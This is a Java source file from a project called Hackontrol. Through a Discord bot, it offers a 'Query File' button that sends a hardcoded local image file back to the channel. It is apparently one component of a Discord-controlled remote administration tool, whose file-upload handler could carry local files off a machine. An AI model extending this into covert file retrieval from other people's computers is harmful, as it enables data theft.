package com.khopan.hackontrol.channel.file;

import java.io.File;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonInteraction;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;

public class FileChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "file";

	private static final String QUERY_FILE_BUTTON_IDENTIFIER = "queryFile";

	@Override
	public String getName() {
		return FileChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Query File", FileChannel.QUERY_FILE_BUTTON_IDENTIFIER))).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.QUERY_FILE_BUTTON_IDENTIFIER, this :: query);
	}

	private void query(ButtonInteraction interaction) {
		File file = new File("D:\\hackontrol-logo.png");
		FileEmbedSender.reply(file, interaction.getEvent());
	}
}
